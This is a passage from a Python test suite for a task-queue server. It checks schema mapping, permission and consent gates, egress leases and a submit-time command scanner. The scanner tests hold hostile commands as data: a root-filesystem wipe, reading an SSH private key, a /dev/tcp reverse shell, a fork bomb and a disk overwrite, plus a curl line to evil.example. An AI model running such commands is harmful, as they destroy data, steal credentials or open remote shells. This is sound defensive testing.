    monkeypatch.setenv("WILLOW_MCP_APPS_ROOT", str(apps_root))
    app_dir = apps_root / "curator"
    app_dir.mkdir(parents=True)
    (app_dir / "manifest.json").write_text(
        json.dumps({"permissions": ["knowledge_curate", "schema_admin", "knowledge_read"]})
    )
    return "curator"


def test_knowledge_flag_denied_without_curate_permission(tmp_path, monkeypatch):
    apps_root = tmp_path / "mcp_apps"
    # B-50/#238: schema_maps/ now lives under WILLOW_HOME directly (no longer
    # nested under mcp_apps/), so isolating WILLOW_MCP_APPS_ROOT alone is not
    # enough to isolate it between tests -- without this, every test using
    # this fixture wrote/read schema maps from conftest.py's one session-wide
    # default WILLOW_HOME, so a mapping confirmed in one test bled into the
    # next test reusing the same app_id.
    monkeypatch.setenv("WILLOW_HOME", str(tmp_path))
    monkeypatch.setenv("WILLOW_MCP_APPS_ROOT", str(apps_root))
    (apps_root / "writer").mkdir(parents=True)
    (apps_root / "writer" / "manifest.json").write_text(
        json.dumps({"permissions": ["knowledge_write", "schema_admin"]})
    )
    fake = _FakePg(columns=_KNOWLEDGE_COLUMNS_WITH_TAGS, canned_rows=[(Json([]),)])
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.schema_confirm_mapping(app_id="writer", table="knowledge")
    result = server.knowledge_flag(
        app_id="writer", atom_id="A1", reason="demo data", severity="high"
    )
    assert "denied" in result["error"]


def test_knowledge_flag_updates_tags_after_confirm(tmp_path, monkeypatch):
    app = _curator_app(tmp_path, monkeypatch)
    fake = _FakePg(columns=_KNOWLEDGE_COLUMNS_WITH_TAGS, canned_rows=[(Json([]),)])
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.schema_confirm_mapping(app_id=app, table="knowledge")
    result = server.knowledge_flag(
        app_id=app, atom_id="A1", reason="synthetic demo", severity="high"
    )
    assert result == {"id": "A1", "flagged": True, "severity": "high"}
    update_sql, params = fake.executed[-1]
    assert "UPDATE knowledge" in update_sql and '"tags"' in update_sql


def test_knowledge_search_excludes_retracted_when_tags_mapped(app_id, monkeypatch):
    fake = _FakePg(columns=_KNOWLEDGE_COLUMNS_WITH_TAGS, canned_rows=[])
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.knowledge_search(app_id=app_id, query="demo")
    select_sql, params = fake.executed[-1]
    assert "NOT" in select_sql and "@>" in select_sql
    assert any(kbc.RETRACT_TAG in str(p) for p in params)


# ── task_submit / task_status / task_list / fleet_health (schema-adapted,
# docs/design/schema-adaptation.md §9 step 5) ──
#
# The real production table is `tasks`, not `kart_task_queue` (confirmed via
# live information_schema introspection 2026-07-08). These tools previously
# hardcoded `kart_task_queue`, which doesn't exist, so every call crashed
# with UndefinedTable. They now go through the same schema_profile mapping
# as the knowledge_* tools.

_TASKS_COLUMNS = [
    ("id", "text"), ("task", "text"), ("submitted_by", "text"),
    ("network_authorization", "text"), ("agent", "text"), ("lane", "text"),
    ("status", "text"), ("result", "jsonb"), ("created_at", "timestamp with time zone"),
    ("completed_at", "timestamp with time zone"), ("claim_owner", "text"),
    ("claimed_at", "timestamp with time zone"), ("attempts", "integer"),
    ("max_attempts", "integer"), ("retry_at", "timestamp with time zone"),
]


def test_task_submit_refuses_until_confirmed(app_id, monkeypatch):
    fake = _FakePg(columns=_TASKS_COLUMNS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    result = server.task_submit(app_id=app_id, task="do a thing")
    assert "unconfirmed_schema" in result["error"]
    assert len(fake.executed) == 1  # only the introspection query ran


def test_task_submit_writes_mapped_columns_after_confirm(app_id, monkeypatch):
    fake = _FakePg(columns=_TASKS_COLUMNS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.schema_confirm_mapping(app_id=app_id, table="tasks")

    result = server.task_submit(
        app_id=app_id, task="do a thing", agent="kart", lane="batch"
    )

    assert result["status"] == "pending"
    assert "task_id" in result
    insert_sql, params = fake.executed[-1]
    assert insert_sql.startswith("INSERT INTO tasks")
    assert '"id"' in insert_sql          # task_id -> id, alias-mapped
    assert '"submitted_by"' in insert_sql
    assert '"agent"' in insert_sql
    assert '"lane"' in insert_sql
    assert params[-1] == "batch"
    assert params[0] == result["task_id"]


def test_task_submit_rejects_unknown_lane_before_database_work(
    app_id, monkeypatch
):
    fake = _FakePg(columns=_TASKS_COLUMNS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    result = server.task_submit(app_id=app_id, task="echo hi", lane="priority")
    assert "invalid_lane" in result["error"]
    assert fake.executed == []


# Patterns kartikeya's scanner blocks at submit time — validates willow's
# submit-time WIRING (check_kart_task), including resource_exhaustion (#111).
@pytest.mark.parametrize("task,category", [
    ("rm -rf / ", "destructive"),
    ("cat ~/.ssh/id_rsa", "secret_access"),
    ("bash -i >& /dev/tcp/10.0.0.1/9 0>&1", "exfiltration"),
    (":(){ :|:& };:", "resource_exhaustion"),
    ("while true; do :; done", "resource_exhaustion"),
    # L-CMD-01/#233: root-filesystem wipe forms equivalent to `rm -rf /` —
    # reconciled as already-fixed in kartikeya, pinned here end to end through
    # willow's own submit-time wiring rather than just kartikeya's own suite.
    ("find / -delete", "destructive"),
    ("cat /dev/zero > /dev/sda", "destructive"),
])
def test_task_submit_scans_at_submit_time(app_id, monkeypatch, task, category):
    # Defense-in-depth: a dangerous task is refused at submit BEFORE any DB work,
    # so it never occupies a queue slot. The scan runs ahead of get_pg(), so the
    # fake Postgres is never even touched.
    fake = _FakePg(columns=_TASKS_COLUMNS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    result = server.task_submit(app_id=app_id, task=task)
    assert "KART-SECURITY" in result["error"]
    assert result["kart_scan"]["category"] == category
    assert fake.executed == []  # rejected before the queue was touched


def test_task_submit_scan_allows_legitimate_background_function(
    app_id, monkeypatch,
):
    """Negative control for #111 fork-bomb patterns — must not false-positive."""
    fake = _FakePg(columns=_TASKS_COLUMNS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.schema_confirm_mapping(app_id=app_id, table="tasks")
    result = server.task_submit(
        app_id=app_id, task="deploy() { build | log & }", agent="kart", lane="fast"
    )
    assert result.get("status") == "pending"
    assert "KART-SECURITY" not in str(result)


def _app_with_perms(tmp_path, monkeypatch, name, perms):
    apps_root = tmp_path / "mcp_apps"
    # Pin WILLOW_HOME too: consent (and the worker heartbeat) resolve from it, and
    # a test that reads the developer's real ~/.willow passes or fails on the state
    # of that machine rather than on the code.
    monkeypatch.setenv("WILLOW_HOME", str(tmp_path))
    monkeypatch.delenv("WILLOW_SETTINGS_GLOBAL", raising=False)
    monkeypatch.setenv("WILLOW_MCP_APPS_ROOT", str(apps_root))
    app_dir = apps_root / name
    app_dir.mkdir(parents=True)
    (app_dir / "manifest.json").write_text(json.dumps({"permissions": perms}))
    return name


def _operator_consents(tmp_path, *, internet=True):
    """Write the standing consent policy the egress gate reads (key 2)."""
    (tmp_path / "settings.global.json").write_text(
        json.dumps({"version": 1, "consent": {"internet": internet,
                                              "cloud_llm": True, "lan": True}})
    )


def _operator_leases(app, *, ttl_seconds=1800):
    """Issue the egress lease the gate reads (key 3, B-32).

    Goes through `lease.grant` rather than writing the file directly: a test that
    hand-writes the artifact would keep passing if `grant` started emitting a
    shape the reader rejects.
    """
    from willow_mcp import lease
    return lease.grant(app, ttl_seconds, issuer="test-operator", reason="unit test")


def _accepted_network_envelope(tmp_path, monkeypatch):
    from willow_mcp import egress_authorization

    public_key = tmp_path / "verify.pem"
    public_key.write_text("test key")
    monkeypatch.setattr(
        egress_authorization, "public_key_path", lambda: public_key
    )
    monkeypatch.setattr(
        egress_authorization,
        "verify_envelope",
        lambda **_kwargs: (
            True,
            "verified",
            {"nonce": "test", "task_id": "NETTASK1", "agent": "kart"},
        ),
    )
    return json.dumps({"payload": {"task_id": "NETTASK1"}, "signature": "test"})


def test_task_submit_allow_net_denied_without_task_net_permission(tmp_path, monkeypatch):
    # B-19: full_access grants task_submit but NOT the escalated net capability.
    app = _app_with_perms(tmp_path, monkeypatch, "netless", ["full_access"])
    _operator_consents(tmp_path)  # consent is ON — the manifest is what denies
    fake = _FakePg(columns=_TASKS_COLUMNS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)

    result = server.task_submit(app_id=app, task="curl https://example.com", allow_net=True)

    assert "net_denied" in result["error"]
    # denied before any write — no INSERT issued
    assert not any("INSERT" in sql for sql, _ in fake.executed)


def test_task_submit_allow_net_appends_directive_with_permission(tmp_path, monkeypatch):
    # B-19: an app that holds task_net may run with network; the Kart worker's
    # `# allow_net` directive is appended to the task text.
    app = _app_with_perms(tmp_path, monkeypatch, "netapp", ["full_access", "task_net"])
    _operator_consents(tmp_path)  # B-29: the second key
    _operator_leases("netapp")    # B-32: the third
    fake = _FakePg(columns=_TASKS_COLUMNS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.schema_confirm_mapping(app_id=app, table="tasks")
    envelope = _accepted_network_envelope(tmp_path, monkeypatch)

    result = server.task_submit(
        app_id=app,
        task="curl https://example.com",
        allow_net=True,
        network_authorization=envelope,
    )

    assert result["status"] == "pending"
    insert_sql, params = fake.executed[-1]
    assert insert_sql.startswith("INSERT INTO tasks")
    # values dict order is task_id, task, ... so the task column value is params[1]
    assert params[1] == "curl https://example.com\n# allow_net"
    assert '"network_authorization"' in insert_sql
    assert params[3] == envelope


def test_task_submit_allow_localhost_requires_and_binds_signed_authority(
    tmp_path, monkeypatch
):
    app = _app_with_perms(
        tmp_path, monkeypatch, "localapp", ["full_access", "task_net"]
    )
    _operator_consents(tmp_path)
    _operator_leases(app)
    fake = _FakePg(columns=_TASKS_COLUMNS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.schema_confirm_mapping(app_id=app, table="tasks")
    envelope = _accepted_network_envelope(tmp_path, monkeypatch)

    result = server.task_submit(
        app_id=app,
        task="curl http://127.0.0.1:11434",
        agent="kart",
        allow_localhost=True,
        network_authorization=envelope,
    )

    assert result == {"task_id": "NETTASK1", "status": "pending"}
    insert_sql, params = fake.executed[-1]
    assert params[1] == "curl http://127.0.0.1:11434\n# allow_localhost"
    assert '"network_authorization"' in insert_sql


def test_task_submit_allow_net_requires_signed_envelope(tmp_path, monkeypatch):
    app = _app_with_perms(
        tmp_path, monkeypatch, "unsigned", ["full_access", "task_net"]
    )
    _operator_consents(tmp_path)
    _operator_leases(app)
    fake = _FakePg(columns=_TASKS_COLUMNS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.schema_confirm_mapping(app_id=app, table="tasks")

    result = server.task_submit(
        app_id=app, task="curl https://example.com", allow_net=True
    )

    assert "operator-signed per-task envelope" in result["error"]
    assert not any("INSERT" in sql for sql, _ in fake.executed)


def test_task_submit_network_denied_when_envelope_column_unmapped(
    tmp_path, monkeypatch
):
    app = _app_with_perms(
        tmp_path, monkeypatch, "oldschema", ["full_access", "task_net"]
    )
    _operator_consents(tmp_path)
    _operator_leases(app)
    old_columns = [
        column for column in _TASKS_COLUMNS if column[0] != "network_authorization"
    ]
    fake = _FakePg(columns=old_columns)
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.schema_confirm_mapping(app_id=app, table="tasks")
    envelope = _accepted_network_envelope(tmp_path, monkeypatch)

    result = server.task_submit(
        app_id=app,
        task="curl https://example.com",
        allow_net=True,
        network_authorization=envelope,
    )

    assert "network_authorization" in result["error"]
    assert not any("INSERT" in sql for sql, _ in fake.executed)


def test_task_submit_allow_net_denied_when_operator_consent_is_off(tmp_path, monkeypatch):
    # B-29: task_net is necessary but not sufficient. The operator's standing
    # consent.internet is the second key, and flipping it off stops egress
    # without touching a single manifest.
    app = _app_with_perms(tmp_path, monkeypatch, "netapp3", ["full_access", "task_net"])
    _operator_consents(tmp_path, internet=False)
    fake = _FakePg(columns=_TASKS_COLUMNS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)

    result = server.task_submit(app_id=app, task="curl https://example.com", allow_net=True)

    assert "consent_denied" in result["error"]
    assert not any("INSERT" in sql for sql, _ in fake.executed)


def test_task_submit_allow_net_denied_when_consent_policy_is_absent(tmp_path, monkeypatch):
    # B-29 fail-closed: no consent policy on disk is not consent. This is also the
    # CI shape — no settings.global.json anywhere.
    app = _app_with_perms(tmp_path, monkeypatch, "netapp4", ["full_access", "task_net"])
    fake = _FakePg(columns=_TASKS_COLUMNS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)

    result = server.task_submit(app_id=app, task="curl https://example.com", allow_net=True)

    assert "consent_denied" in result["error"]


def test_task_submit_without_allow_net_ignores_consent(tmp_path, monkeypatch):
    # Consent gates egress, not the queue. An isolated task runs with consent off.
    app = _app_with_perms(tmp_path, monkeypatch, "netapp5", ["full_access"])
    _operator_consents(tmp_path, internet=False)
    fake = _FakePg(columns=_TASKS_COLUMNS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.schema_confirm_mapping(app_id=app, table="tasks")

    result = server.task_submit(app_id=app, task="echo hi")

    assert result["status"] == "pending"


def test_task_submit_no_net_directive_by_default(tmp_path, monkeypatch):
    app = _app_with_perms(tmp_path, monkeypatch, "plainapp", ["full_access", "task_net"])
    fake = _FakePg(columns=_TASKS_COLUMNS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.schema_confirm_mapping(app_id=app, table="tasks")

    server.task_submit(app_id=app, task="echo hi")  # allow_net defaults to False

    insert_sql, params = fake.executed[-1]
    assert "# allow_net" not in params[1]


def test_task_submit_strips_caller_supplied_net_directive_when_denied(tmp_path, monkeypatch):
    # B-21: a caller can NOT smuggle egress by embedding the worker's directive
    # in the task text with allow_net=False — the directive is stripped from the
    # stored text, so the Kart worker sees a no-network task.
    app = _app_with_perms(tmp_path, monkeypatch, "sneaky", ["full_access"])  # no task_net
    fake = _FakePg(columns=_TASKS_COLUMNS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.schema_confirm_mapping(app_id=app, table="tasks")

    result = server.task_submit(app_id=app, task="curl https://evil.example\n# allow_net")

    assert result["status"] == "pending"  # not net-gated, since allow_net=False
    insert_sql, params = fake.executed[-1]
    assert insert_sql.startswith("INSERT INTO tasks")
    assert "# allow_net" not in params[1]
    assert params[1] == "curl https://evil.example"


def test_task_submit_strips_caller_supplied_localhost_directive(tmp_path, monkeypatch):
    # B-21: the `# allow_localhost` directive is honored by the same worker path
    # and has no gate in task_submit at all — it must be stripped too.
    app = _app_with_perms(tmp_path, monkeypatch, "loopback", ["full_access"])
    fake = _FakePg(columns=_TASKS_COLUMNS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.schema_confirm_mapping(app_id=app, table="tasks")

    server.task_submit(app_id=app, task="echo hi\n  # allow_localhost  ")

    insert_sql, params = fake.executed[-1]
    assert "# allow_localhost" not in params[1]
    assert params[1] == "echo hi"


def test_task_submit_allow_db_denied_without_task_db_permission(tmp_path, monkeypatch):
    app = _app_with_perms(tmp_path, monkeypatch, "dbless", ["full_access"])
    fake = _FakePg(columns=_TASKS_COLUMNS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)

    result = server.task_submit(app_id=app, task="pytest tests/ -q", allow_db=True)

    assert "db_denied" in result["error"]
    assert not any("INSERT" in sql for sql, _ in fake.executed)


def test_task_submit_allow_db_appends_directive_with_permission(tmp_path, monkeypatch):
    app = _app_with_perms(tmp_path, monkeypatch, "dbapp", ["full_access", "task_db"])
    fake = _FakePg(columns=_TASKS_COLUMNS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.schema_confirm_mapping(app_id=app, table="tasks")

    result = server.task_submit(app_id=app, task="pytest tests/ -q", allow_db=True)

    assert result["status"] == "pending"
    insert_sql, params = fake.executed[-1]
    assert params[1] == "pytest tests/ -q\n# allow_db"


def test_task_submit_strips_caller_supplied_db_directive(tmp_path, monkeypatch):
    app = _app_with_perms(tmp_path, monkeypatch, "sneakydb", ["full_access"])
    fake = _FakePg(columns=_TASKS_COLUMNS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.schema_confirm_mapping(app_id=app, table="tasks")

    result = server.task_submit(app_id=app, task="pytest tests/ -q\n# allow_db")

    assert result["status"] == "pending"
    insert_sql, params = fake.executed[-1]
    assert "# allow_db" not in params[1]
    assert params[1] == "pytest tests/ -q"


def test_default_kart_task_env_has_no_pg_access(tmp_path, monkeypatch):
    from kartikeya import sandbox as ks

    # Fleet kart-sandbox.json may list PG/POSTGRES in env_prefixes unconditionally;
    # isolate $WILLOW_HOME so this test pins kartikeya's product-default prefixes.
    monkeypatch.setenv("WILLOW_HOME", str(tmp_path))
    monkeypatch.delenv("KART_SANDBOX_CONFIG", raising=False)
    monkeypatch.setattr(
        "kartikeya.home.willow_home", lambda package_root=None: tmp_path
    )
    (tmp_path / "kart-sandbox.json").write_text(
        json.dumps(
            {
                "env_prefixes": [
                    "WILLOW_",
                    "GROVE_",
                    "OLLAMA_",
                    "GIT_",
                    "ANTHROPIC_",
                    "GROQ_",
                ],
            }
        ),
        encoding="utf-8",
    )
    monkeypatch.setenv("PGHOST", "/run/postgresql")
    monkeypatch.setenv("POSTGRES_PASSWORD", "secret")
    env = ks.kart_env(allow_db=False)
    assert "PGHOST" not in env
    assert "POSTGRES_PASSWORD" not in env
    argv = ks.build_bwrap_argv(allow_db=False)
    assert not any("postgresql" in part for part in argv)


def test_task_submit_permitted_net_survives_caller_directive_dedup(tmp_path, monkeypatch):
    # B-21: even when the caller also embeds the directive, a task_net-permitted
    # allow_net=True submit stores exactly one canonical `# allow_net` line.
    app = _app_with_perms(tmp_path, monkeypatch, "netapp2", ["full_access", "task_net"])
    _operator_consents(tmp_path)  # B-29: the second key
    _operator_leases("netapp2")   # B-32: the third
    fake = _FakePg(columns=_TASKS_COLUMNS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.schema_confirm_mapping(app_id=app, table="tasks")
    envelope = _accepted_network_envelope(tmp_path, monkeypatch)

    result = server.task_submit(
        app_id=app,
        task="curl https://example.com\n# allow_net",
        allow_net=True,
        network_authorization=envelope,
    )

    assert result["status"] == "pending"
    insert_sql, params = fake.executed[-1]
    assert params[1].count("# allow_net") == 1
    assert params[1] == "curl https://example.com\n# allow_net"


def test_task_submit_allow_net_denied_without_a_lease(tmp_path, monkeypatch):
    # B-32: capability + consent are necessary but not sufficient. Without an
    # operator-issued lease there is nothing time-boxing the grant, and a grant
    # that never expires cannot be distinguished from one taken an hour ago.
    app = _app_with_perms(tmp_path, monkeypatch, "leaseless", ["full_access", "task_net"])
    _operator_consents(tmp_path)
    fake = _FakePg(columns=_TASKS_COLUMNS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)

    result = server.task_submit(app_id=app, task="curl https://example.com", allow_net=True)

    assert "lease_denied" in result["error"]
    assert "grant-net" in result["error"]  # names the only path that issues one
    assert not any("INSERT" in sql for sql, _ in fake.executed)


def test_task_submit_allow_net_denied_when_lease_expired(tmp_path, monkeypatch):
    # The whole point of a lease: it stops working on its own.
    from willow_mcp import lease
    app = _app_with_perms(tmp_path, monkeypatch, "expapp", ["full_access", "task_net"])
    _operator_consents(tmp_path)
    _operator_leases("expapp", ttl_seconds=1)
    # Rewrite the deadline into the past rather than sleeping.
    path = lease.lease_path("expapp")
    record = json.loads(path.read_text())
    record["expires_at"] = "2020-01-01T00:00:00+00:00"
    path.write_text(json.dumps(record))
    fake = _FakePg(columns=_TASKS_COLUMNS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)

    result = server.task_submit(app_id=app, task="curl https://example.com", allow_net=True)

    assert "lease_denied" in result["error"]
    assert "expired" in result["error"]
    assert not any("INSERT" in sql for sql, _ in fake.executed)


def test_task_submit_allow_net_denied_when_lease_names_another_app(tmp_path, monkeypatch):
    # A name is not an identity. The filename says where we looked; only the
    # record's own app_id claim counts.
    from willow_mcp import lease
    app = _app_with_perms(tmp_path, monkeypatch, "victim", ["full_access", "task_net"])
    _operator_consents(tmp_path)
    _operator_leases("victim")
    path = lease.lease_path("victim")
    record = json.loads(path.read_text())
    record["app_id"] = "someone-else"
    path.write_text(json.dumps(record))
    fake = _FakePg(columns=_TASKS_COLUMNS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)

    result = server.task_submit(app_id=app, task="curl https://example.com", allow_net=True)

    assert "lease_denied" in result["error"]
    assert "mismatch" in result["error"]
    assert not any("INSERT" in sql for sql, _ in fake.executed)


def test_task_submit_allow_net_denied_when_lease_unparseable(tmp_path, monkeypatch):
    from willow_mcp import lease
    app = _app_with_perms(tmp_path, monkeypatch, "corrupt", ["full_access", "task_net"])
    _operator_consents(tmp_path)
    _operator_leases("corrupt")
    lease.lease_path("corrupt").write_text("{ not json")
    fake = _FakePg(columns=_TASKS_COLUMNS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)

    result = server.task_submit(app_id=app, task="curl https://example.com", allow_net=True)

    assert "lease_denied" in result["error"]
    assert "malformed" in result["error"]


def test_task_submit_lease_checked_after_capability_and_consent(tmp_path, monkeypatch):
    """Key order is not cosmetic: an app with no capability must hear about the
    capability, not be told to go ask for a lease it could never use."""
    app = _app_with_perms(tmp_path, monkeypatch, "ordering", ["full_access"])
    _operator_consents(tmp_path, internet=False)  # both later keys also absent
    fake = _FakePg(columns=_TASKS_COLUMNS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)

    result = server.task_submit(app_id=app, task="curl https://example.com", allow_net=True)

    assert "net_denied" in result["error"]
    assert "lease_denied" not in result["error"]


def test_task_submit_without_allow_net_ignores_the_lease(tmp_path, monkeypatch):
    # The lease gates egress, not the queue. An isolated task needs no lease.
    app = _app_with_perms(tmp_path, monkeypatch, "isolated", ["full_access"])
    fake = _FakePg(columns=_TASKS_COLUMNS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.schema_confirm_mapping(app_id=app, table="tasks")

    result = server.task_submit(app_id=app, task="echo hi")

    assert result["status"] == "pending"


def test_task_submit_strict_trust_root_denies_when_keys_are_self_writable(tmp_path, monkeypatch):
    # B-32 strict mode: every key held, but this process can write the files that
    # grant them, so nothing was actually confirmed by anyone else.
    app = _app_with_perms(tmp_path, monkeypatch, "strictapp", ["full_access", "task_net"])
    _operator_consents(tmp_path)
    _operator_leases("strictapp")
    monkeypatch.setenv("WILLOW_MCP_STRICT_TRUST_ROOT", "1")
    fake = _FakePg(columns=_TASKS_COLUMNS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.schema_confirm_mapping(app_id=app, table="tasks")
    envelope = _accepted_network_envelope(tmp_path, monkeypatch)

    result = server.task_submit(
        app_id=app,
        task="curl https://example.com",
        allow_net=True,
        network_authorization=envelope,
    )

    assert "trust_root_denied" in result["error"]
    assert not any("INSERT" in sql for sql, _ in fake.executed)


def test_task_submit_strict_trust_root_off_by_default(tmp_path, monkeypatch):
    """The residual is reported, not enforced by default — enforcing it on a
    single-uid host would deny every install's egress on upgrade."""
    app = _app_with_perms(tmp_path, monkeypatch, "laxapp", ["full_access", "task_net"])
    _operator_consents(tmp_path)
    _operator_leases("laxapp")
    monkeypatch.delenv("WILLOW_MCP_STRICT_TRUST_ROOT", raising=False)
    fake = _FakePg(columns=_TASKS_COLUMNS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.schema_confirm_mapping(app_id=app, table="tasks")
    envelope = _accepted_network_envelope(tmp_path, monkeypatch)

    result = server.task_submit(
        app_id=app,
        task="curl https://example.com",
        allow_net=True,
        network_authorization=envelope,
    )

    assert result["status"] == "pending"


def test_task_status_not_found(app_id, monkeypatch):
    fake = _FakePg(columns=_TASKS_COLUMNS, canned_rows=[])
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    assert server.task_status(app_id=app_id, task_id="ghost") == {"error": "not_found"}


def test_task_status_maps_id_to_task_id_and_surfaces_unmapped(app_id, monkeypatch):
    fake = _FakePg(
        columns=_TASKS_COLUMNS,
        canned_rows=[
            (
                "T1",
                "do a thing",
                "willow",
                "kart",
                "fast",
                "pending",
                None,
                "2026-07-08",
                None,
                None,
                None,
                0,
                3,
                None,
            )
        ],
    )
    monkeypatch.setattr(server, "get_pg", lambda: fake)

    result = server.task_status(app_id=app_id, task_id="T1")

    assert result["task_id"] == "T1"
    assert result["status"] == "pending"
    assert "network_authorization" not in result
    assert set(result["_unmapped"]) == {"steps"}
    select_sql, params = fake.executed[-1]
    assert '"id" AS "task_id"' in select_sql
    assert 'WHERE "id" = %s' in select_sql
    assert params == ("T1",)


def test_task_status_table_not_found(app_id, monkeypatch):
    fake = _FakePg(columns=[])
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    result = server.task_status(app_id=app_id, task_id="T1")
    assert result == {"error": "table_not_found", "table": "tasks"}


def test_task_list_filters_by_status_and_agent(app_id, monkeypatch):
    fake = _FakePg(
        columns=_TASKS_COLUMNS,
        canned_rows=[("T1", "x" * 100, "willow", "2026-07-08")],
    )
    monkeypatch.setattr(server, "get_pg", lambda: fake)

    result = server.task_list(app_id=app_id, agent="kart", limit=5)

    assert result["pending"][0]["task_id"] == "T1"
    assert len(result["pending"][0]["task"]) == 80  # truncated
    assert result["next_cursor"] is None  # single row, no more pages
    select_sql, params = fake.executed[-1]
    assert '"status" = \'pending\'' in select_sql
    assert '"agent" = %s' in select_sql
    assert params == ("kart", 6)  # limit + 1 for has_more detection


def test_fleet_health_counts_by_mapped_status_column(app_id, monkeypatch, tmp_path):
    monkeypatch.setenv("WILLOW_HOME", str(tmp_path))  # no live worker heartbeats
    fake = _FakePg(columns=_TASKS_COLUMNS, canned_rows=[("pending", 3), ("completed", 7)])
    monkeypatch.setattr(server, "get_pg", lambda: fake)

    result = server.fleet_health(app_id=app_id)

    counts = {k: result[k] for k in ("pending", "running", "completed", "failed", "total")}
    assert counts == {"pending": 3, "running": 0, "completed": 7, "failed": 0, "total": 10}
    # 3 pending with nothing draining them: queued is not the same as progressing.
    assert result["stranded"] is True
    assert result["workers"]["alive"] == 0
    issued = [s for s, _ in fake.executed]
    assert 'SELECT "status", COUNT(*) FROM tasks GROUP BY "status"' in issued


def test_fleet_health_not_stranded_when_a_worker_is_alive(app_id, monkeypatch, tmp_path):
    monkeypatch.setenv("WILLOW_HOME", str(tmp_path))
    from willow_mcp.heartbeat import WorkerHeartbeat
    beat = WorkerHeartbeat(interval=5.0)
    beat()
    fake = _FakePg(columns=_TASKS_COLUMNS, canned_rows=[("pending", 3)])
    monkeypatch.setattr(server, "get_pg", lambda: fake)

    result = server.fleet_health(app_id=app_id)

    assert result["stranded"] is False
    assert result["workers"]["alive"] == 1


def test_fleet_health_not_stranded_when_queue_is_empty(app_id, monkeypatch, tmp_path):
    monkeypatch.setenv("WILLOW_HOME", str(tmp_path))
    fake = _FakePg(columns=_TASKS_COLUMNS, canned_rows=[("completed", 7)])
    monkeypatch.setattr(server, "get_pg", lambda: fake)

    result = server.fleet_health(app_id=app_id)

    assert result["stranded"] is False


def test_fleet_health_reports_per_lane_stranding(app_id, monkeypatch, tmp_path):
    # With a mapped lane column and pending work, fleet_health issues the per-lane
    # pending query and reports stranded_lanes for any lane with no alive worker
    # (Loki DD0114E5 §2.2). (_FakePg returns the same rows for every query, so the
    # lane label is a test-double artifact; the clean per-lane semantics live in
    # test_heartbeat's read_workers/_derive_problems tests.)
    monkeypatch.setenv("WILLOW_HOME", str(tmp_path))  # no live workers → nothing ready
    fake = _FakePg(columns=_TASKS_COLUMNS, canned_rows=[("pending", 2)])
    monkeypatch.setattr(server, "get_pg", lambda: fake)

    result = server.fleet_health(app_id=app_id)

    issued = [s for s, _ in fake.executed]
    assert any("GROUP BY 1" in s and "= 'pending'" in s for s in issued), \
        "the per-lane pending query must be issued"
    assert result["pending_by_lane"]  # populated
    assert result["stranded_lanes"], "a lane with pending work and no alive worker is stranded"


def test_fleet_health_no_per_lane_query_when_queue_empty(app_id, monkeypatch, tmp_path):
    monkeypatch.setenv("WILLOW_HOME", str(tmp_path))
    fake = _FakePg(columns=_TASKS_COLUMNS, canned_rows=[("completed", 7)])
    monkeypatch.setattr(server, "get_pg", lambda: fake)

    result = server.fleet_health(app_id=app_id)

    issued = [s for s, _ in fake.executed]
    assert not any("GROUP BY 1" in s for s in issued)
    assert result["stranded_lanes"] == []


def test_fleet_health_table_not_found(app_id, monkeypatch):
    fake = _FakePg(columns=[])
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    result = server.fleet_health(app_id=app_id)
    assert result == {"error": "table_not_found", "table": "tasks"}


# ── Gap backlog tools (gap_log/list/resolve are SOIL-only; gap_promote reaches
# Postgres through the exact same _knowledge_ingest_core/schema-confirmation
# path as knowledge_ingest, tested here with the same _FakePg double) ─────────

def test_gap_log_denied_without_permission(tmp_path, monkeypatch):
    apps_root = tmp_path / "mcp_apps"
    # B-50/#238: schema_maps/ now lives under WILLOW_HOME directly (no longer
    # nested under mcp_apps/), so isolating WILLOW_MCP_APPS_ROOT alone is not
    # enough to isolate it between tests -- without this, every test using
    # this fixture wrote/read schema maps from conftest.py's one session-wide
    # default WILLOW_HOME, so a mapping confirmed in one test bled into the
    # next test reusing the same app_id.
    monkeypatch.setenv("WILLOW_HOME", str(tmp_path))
    monkeypatch.setenv("WILLOW_MCP_APPS_ROOT", str(apps_root))
    app_dir = apps_root / "reader_only"
    app_dir.mkdir(parents=True)
    (app_dir / "manifest.json").write_text(json.dumps({"permissions": ["gap_read"]}))

    result = server.gap_log(app_id="reader_only", topic="t", question="What color?")
    assert "denied" in result["error"]


def test_gap_log_and_list_round_trip(app_id):
    logged = server.gap_log(app_id=app_id, topic="t-server", question="What is the accent color?")
    assert logged["status"] == "open"

    result = server.gap_list(app_id=app_id, topic="t-server")
    assert any(r["question"] == "What is the accent color?" for r in result["items"])


def test_gap_resolve_marks_bookkeeping_status(app_id):
    logged = server.gap_log(app_id=app_id, topic="t-server-resolve", question="What is the border radius?")
